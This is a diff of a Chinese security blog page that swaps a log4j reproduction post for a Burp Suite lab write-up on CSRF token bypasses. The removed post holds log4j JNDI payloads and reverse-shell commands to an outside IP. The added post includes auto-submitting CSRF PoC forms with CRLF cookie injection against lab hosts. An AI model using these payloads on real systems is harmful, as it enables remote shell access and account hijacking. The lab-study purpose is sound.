@@ -16,24 +16,24 @@
   <meta name="author" content="QY">
   <meta name="keywords" content="">
   
-    <meta name="description" content="1.理解log4j漏洞的前置知识1.JNDI接口JNDI即Java Naming and Directory Interface（JAVA命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。 有一个类似于字典的数据源，你可以通过JNDI接口，传一个name进去，就能获取到对象了。 2.LDAP协议LDAP称为轻量级目录访问协议，既是">
+    <meta name="description" content="1.没有防御措施的CSRF漏洞最基本的csrf漏洞 登录之后在修改邮箱这里抓包  然后制作csrf poc  将poc复制 粘贴到漏洞利用的body里点击 store和 Deliver exploit to victim即可完成  2.CSRF，其中令牌验证取决于请求方法同样是在更改邮件抓包 ! 可以发现，这串使用了csrftoken验证了用户身份 可以尝试将email通过get提交这样就可以绕过">
 <meta property="og:type" content="article">
-<meta property="og:title" content="log4j复现">
-<meta property="og:url" content="http://example.com/2023/03/12/log4j%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:title" content="burpsuite靶场csrf">
+<meta property="og:url" content="http://example.com/2023/08/11/burpsuite%E9%9D%B6%E5%9C%BAcsrf/index.html">
 <meta property="og:site_name" content="yaya-blog">
-<meta property="og:description" content="1.理解log4j漏洞的前置知识1.JNDI接口JNDI即Java Naming and Directory Interface（JAVA命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。 有一个类似于字典的数据源，你可以通过JNDI接口，传一个name进去，就能获取到对象了。 2.LDAP协议LDAP称为轻量级目录访问协议，既是">
+<meta property="og:description" content="1.没有防御措施的CSRF漏洞最基本的csrf漏洞 登录之后在修改邮箱这里抓包  然后制作csrf poc  将poc复制 粘贴到漏洞利用的body里点击 store和 Deliver exploit to victim即可完成  2.CSRF，其中令牌验证取决于请求方法同样是在更改邮件抓包 ! 可以发现，这串使用了csrftoken验证了用户身份 可以尝试将email通过get提交这样就可以绕过">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303122259262.jpg">
-<meta property="article:published_time" content="2023-03-12T12:07:09.000Z">
-<meta property="article:modified_time" content="2023-03-12T14:59:37.600Z">
+<meta property="og:image" content="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308110931791.jpg">
+<meta property="article:published_time" content="2023-08-11T01:30:30.000Z">
+<meta property="article:modified_time" content="2023-08-13T02:50:34.990Z">
 <meta property="article:author" content="QY">
-<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="-burpsuite靶场 -CSRF">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303122259262.jpg">
+<meta name="twitter:image" content="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308110931791.jpg">
   
   
   
-  <title>log4j复现 - yaya-blog</title>
+  <title>burpsuite靶场csrf - yaya-blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +199,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="log4j复现"></span>
+            <span id="subtitle" data-typed-text="burpsuite靶场csrf"></span>
           
         </div>
 
@@ -210,8 +210,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-03-12 20:07" pubdate>
-          2023年3月12日 晚上
+        <time datetime="2023-08-11 09:30" pubdate>
+          2023年8月11日 上午
         </time>
       </span>
     
@@ -222,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k 字
+          2.8k 字
         
       </span>
     
@@ -233,7 +233,7 @@
         
         
         
-          14 分钟
+          24 分钟
         
       </span>
     
@@ -271,49 +271,72 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">log4j复现</h1>
+            <h1 style="display: none">burpsuite靶场csrf</h1>
             
             
               <div class="markdown-body">
                 
-                <h3 id="1-理解log4j漏洞的前置知识"><a href="#1-理解log4j漏洞的前置知识" class="headerlink" title="1.理解log4j漏洞的前置知识"></a>1.理解log4j漏洞的前置知识</h3><h4 id="1-JNDI接口"><a href="#1-JNDI接口" class="headerlink" title="1.JNDI接口"></a>1.JNDI接口</h4><p>JNDI即Java Naming and Directory Interface（JAVA命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p>
-<p><strong>有一个类似于字典的数据源，你可以通过JNDI接口，传一个name进去，就能获取到对象了。</strong></p>
-<h4 id="2-LDAP协议"><a href="#2-LDAP协议" class="headerlink" title="2.LDAP协议"></a>2.LDAP协议</h4><p>LDAP称为轻量级目录访问协议，既是一种服务，也是一种协议，是JNDI的一种底层实现，主要功能是提供命名关键字到对象的映射目录，开发人员可以通过输入名称，获取到对象的内容。</p>
-<p><strong>有一个类似于字典的数据源，你可以通过LDAP协议，传一个name进去，就能获取到数据。</strong></p>
-<h4 id="3-RMI协议"><a href="#3-RMI协议" class="headerlink" title="3.RMI协议"></a>3.RMI协议</h4><p><strong>JAVA的一种远程接口调用协议，在TCP协议上传递可序列化的Java对象，即可以实现调用远程方法和调用本地方法一样简单。</strong></p>
-<h4 id="4-Log4j"><a href="#4-Log4j" class="headerlink" title="4.Log4j"></a>4.Log4j</h4><p>Log4j是由Apache提供的日志操作包，用于帮助用户处理日志信息。通过Log4j，可以控制日志信息输送的目的地是控制台、文件、GUI组件、甚至是套接口服务器等各种地方。</p>
-<h3 id="2-Log4j漏洞的成因"><a href="#2-Log4j漏洞的成因" class="headerlink" title="2.Log4j漏洞的成因"></a>2.Log4j漏洞的成因</h3><p>Log4j为了输出日志时能输出任意位置的Java对象，引入了Lookup接口，这个Lookup接口可以看作是JNDI的一种实现，允许按照具体的名称逻辑查找对象的位置，并输出对象的内容，此对象可以通过Java的序列化或反序列化传输，从远程服务器上查找。</p>
-<p>由于Lookup接口的原因，Log4j就暗含JNDI注入漏洞，可以联合使用JNDI+LDAP或者JNDI+RMI通过命名功能直接从远程服务器上调用文件并在本地执行。</p>
-<p>Log4j在处理消息转换时，会按照字符检测每条日志，当日志中包含${}时，则会将表达式的内容替换成真实的内容(即lookup接口查找得到的内容），使用LDAP或RMI协议，能从远程服务区上请求恶意的对象，对象在调用的过程中会被解析执行，导致了Log4j的漏洞。</p>
-<p>该漏洞的主要原因是log4j在日志输出中，未对字符合法性进行严格的限制，执行了JNDI协议加载的远程恶意脚本，从而造成RCE。</p>
-<h3 id="3-log4j漏洞复现"><a href="#3-log4j漏洞复现" class="headerlink" title="3.log4j漏洞复现"></a>3.log4j漏洞复现</h3><h4 id="1-检测漏洞是否存在"><a href="#1-检测漏洞是否存在" class="headerlink" title="1.检测漏洞是否存在"></a>1.检测漏洞是否存在</h4><p>在线靶场 </p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//ctf.show/challenges#Log<span class="hljs-number">4</span>j<span class="hljs-variable">%E5</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%8</span>D<span class="hljs-variable">%E7</span><span class="hljs-variable">%8</span>E<span class="hljs-variable">%B0-1730</span><br></code></pre></td></tr></table></figure>
+                <h3 id="1-没有防御措施的CSRF漏洞"><a href="#1-没有防御措施的CSRF漏洞" class="headerlink" title="1.没有防御措施的CSRF漏洞"></a>1.没有防御措施的CSRF漏洞</h3><p>最基本的csrf漏洞</p>
+<p>登录之后在修改邮箱这里抓包</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308110938555.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload alt=" "></p>
+<p>然后制作csrf poc</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308110940762.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>将poc复制</p>
+<p>粘贴到漏洞利用的body里点击 store和 Deliver exploit to victim即可完成</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308110941267.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<h3 id="2-CSRF，其中令牌验证取决于请求方法"><a href="#2-CSRF，其中令牌验证取决于请求方法" class="headerlink" title="2.CSRF，其中令牌验证取决于请求方法"></a>2.CSRF，其中令牌验证取决于请求方法</h3><p>同样是在更改邮件抓包</p>
+<p>!<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308111000029.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload alt=" " style="zoom:67%;" /></p>
+<p>可以发现，这串使用了csrftoken验证了用户身份</p>
+<p>可以尝试将email通过get提交这样就可以绕过csrf值的验证</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308111001678.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308111001442.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>然后生成poc 利用即可</p>
+<p>总结：当post请求带有token等验证字符时可以切换请求方式如GET来绕过认证，反正其他请求方式也可以改为post绕过</p>
+<h3 id="3-CSRF，其中令牌验证取决于令牌的存在"><a href="#3-CSRF，其中令牌验证取决于令牌的存在" class="headerlink" title="3.CSRF，其中令牌验证取决于令牌的存在"></a>3.CSRF，其中令牌验证取决于令牌的存在</h3><p>抓包</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308111028381.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:50%;" />
 
-<p>payload配合dnslog检测漏洞是否存在</p>
-<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span>&#123;jndi:ldap:<span class="hljs-comment">//ntoand.dnslog.cn&#125;</span><br></code></pre></td></tr></table></figure>
+<p>有token，尝试将token键值全部删除看看是否能绕过认证</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308111030870.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
 
-<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303122204654.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
-<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303122205977.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
-<h4 id="2-进一步利用"><a href="#2-进一步利用" class="headerlink" title="2.进一步利用"></a>2.进一步利用</h4><p>在服务器上启动ladp服务</p>
-<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303122214917.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
-<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303122221534.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
-<p>监听开启</p>
-<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303122223114.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
-<p>接下来进行payload构造</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ldap:<span class="hljs-regexp">//</span>null:<span class="hljs-number">1389</span><span class="hljs-regexp">/Basic/</span>Command<span class="hljs-regexp">/Base64/</span>[base64_encoded_cmd]<br></code></pre></td></tr></table></figure>
+<p>成功绕过</p>
+<p>制作poc提交即可</p>
+<p>总结：可以尝试通过删除认证字段绕过</p>
+<h3 id="4-令牌不绑定到用户会话的-CSRF"><a href="#4-令牌不绑定到用户会话的-CSRF" class="headerlink" title="4.令牌不绑定到用户会话的 CSRF"></a>4.令牌不绑定到用户会话的 CSRF</h3><p>抓包</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308111050426.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>这题考的是csrf值没有与账号绑定造成的csrf被其他账号引用，我们就可以利用来进行csrf攻击</p>
+<p>并且发现csrf值只能被使用一次就失效了</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308111100084.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
 
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/yourip/</span><span class="hljs-number">1099</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span> <br></code></pre></td></tr></table></figure>
+<p>所以抓包之后直接制作poc确保csrf没有被引用过，然后发送给受害者即可</p>
+<p>总结：csrf认证值如果没有绑定用户会被其他用户引用</p>
+<h3 id="5-CSRF，其中令牌绑定到非会话cookie"><a href="#5-CSRF，其中令牌绑定到非会话cookie" class="headerlink" title="5.CSRF，其中令牌绑定到非会话cookie"></a>5.CSRF，其中令牌绑定到非会话cookie</h3><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308111225613.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
 
-<p>如</p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">$&#123;jndi:ldap://<span class="hljs-number">113.14</span>.<span class="hljs-number">5.159</span>:<span class="hljs-number">1389</span>/TomcatBypass/Command/Base<span class="hljs-number">64</span>/YmFzaCAtaSA<span class="hljs-variable">%2</span>bJiAvZGV<span class="hljs-number">2</span>L<span class="hljs-number">3</span>RjcC<span class="hljs-number">8</span>xMTMuMTQuNS<span class="hljs-number">4</span>xNTkvMjMzMyAwPiYxIA<span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d&#125;<br></code></pre></td></tr></table></figure>
+<p>经过抓包发现csrf可以被复用，进行多次邮箱修改</p>
+<p>cookie值里面有csrfkey项，一般 是用于验证csrf值的正确性，换句话说csrfkey和csrf绑定在了一起这两个的值必须都正确才能成功操作。</p>
+<p>但是修改csrf值和csrfkey值发现</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308111235545.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>他的报错为csrf token错误，但是并没有注销用户，因此猜测csrfkey和csrf没有绑定用户，可以被其他用户调用。</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308111240200.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
 
-<p>YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMTMuMTQuNS4xNTkvMjMzMyAwPiYxIA%3d%3d</p>
-<h3 id="四、Log4j的临时缓解措施"><a href="#四、Log4j的临时缓解措施" class="headerlink" title="四、Log4j的临时缓解措施"></a>四、Log4j的临时缓解措施</h3><p>关闭lookup功能：</p>
-<p>（1）设置log4j2.formatMsgNoLookups&#x3D;True</p>
-<p>（2）Dlog4j2.formatMsgNoLookups&#x3D;true。</p>
-<p>（3）设置系统环境变量FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS为true</p>
-<p>（4）采用防火墙对请求流量中的${jndi进行拦截，防止JNDI注入。</p>
-<p>（5）禁止存在漏洞的业务访问外网，主动外连外网。</p>
+<p>在另一个账号修改邮箱发现 csrf和csrfkey没有改变说明没有绑定用户</p>
+<p>并且进行搜索时发现并没有采用csrf进行认证，所以可以向搜索功能注入cookie</p>
+<p>制作的poc为</p>
+<p>当进行搜索的时候将</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">history.<span class="hljs-title function_">pushState</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://0a0f00ab047e25818047622500010025.web-security-academy.net/my-account/change-email&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;2<span class="hljs-symbol">&amp;#64;</span>2<span class="hljs-symbol">&amp;#46;</span>cn&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;csrf&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;2GWPGPcA9ZbEJJvwAA66ROfrF1vPqahC&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://0a0f00ab047e25818047622500010025.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=0EEU300C8f0ENSAOZIzK1kn9Q0uk6tOI%3b%20SameSite=None&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;document.forms[0].submit()&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br>利用了恶意的图像加载以触发跨站请求伪造攻击，目标是在用户浏览器中触发一个POST请求，以修改用户账户的电子邮件地址。在此过程中，攻击者伪造了 email 字段和 csrf 字段，以便欺骗受害者的浏览器。<br></code></pre></td></tr></table></figure>
+
+<p>那么我们向cookie注入我们的csrfkey，post请求再带上csrf就可以完成csrf攻击</p>
+<h3 id="6-在cookie中复制令牌的CSRF"><a href="#6-在cookie中复制令牌的CSRF" class="headerlink" title="6.在cookie中复制令牌的CSRF"></a>6.在cookie中复制令牌的CSRF</h3><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308111700301.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>发现cookie里的csrf和请求体的csrf值是一样的，那就可以尝试在cookie中注入csrf值</p>
+<p>poc</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">history.<span class="hljs-title function_">pushState</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://0a07009604dbdfc880902bac004b0019.web-security-academy.net/my-account/change-email&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1q1<span class="hljs-symbol">&amp;#64;</span>qq<span class="hljs-symbol">&amp;#46;</span>com&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;csrf&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;LsQqZ8J8aFqk0eGWrCKYXkmfQqNPXT2c&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://0a07009604dbdfc880902bac004b0019.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=LsQqZ8J8aFqk0eGWrCKYXkmfQqNPXT2c%3b%20SameSite=None&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;document.forms[0].submit();&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>总结，csrf值直接从cookie读取，可以在cookie注入csrf来绕过</p>
+<h3 id="7-通过方法覆盖绕过同站点松懈"><a href="#7-通过方法覆盖绕过同站点松懈" class="headerlink" title="7.通过方法覆盖绕过同站点松懈"></a>7.通过方法覆盖绕过同站点松懈</h3><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308131046128.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>抓包发现没有token等限制</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308131050891.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:67%;" />
+
+<p>GET请求会被限制</p>
 
                 
               </div>
@@ -347,7 +370,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">#漏洞复现</a>
+        <a href="/tags/burpsuite%E9%9D%B6%E5%9C%BA-CSRF/">#-burpsuite靶场 -CSRF</a>
       
     </div>
   
@@ -359,8 +382,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>log4j复现</div>
-      <div>http://example.com/2023/03/12/log4j复现/</div>
+      <div>burpsuite靶场csrf</div>
+      <div>http://example.com/2023/08/11/burpsuite靶场csrf/</div>
     </div>
     <div class="license-meta">
       
@@ -372,7 +395,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年3月12日</div>
+          <div>2023年8月11日</div>
         </div>
       
       
@@ -404,9 +427,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/03/14/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="内网信息收集">
+                      <a href="/2023/08/12/WPS-rce-0day-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="WPS-rce-0day-漏洞复现">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">内网信息收集</span>
+                        <span class="hidden-mobile">WPS-rce-0day-漏洞复现</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -414,8 +437,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/03/11/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" title="sql注入笔记">
-                        <span class="hidden-mobile">sql注入笔记</span>
+                      <a href="/2023/04/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/" title="红日靶场4">
+                        <span class="hidden-mobile">红日靶场4</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
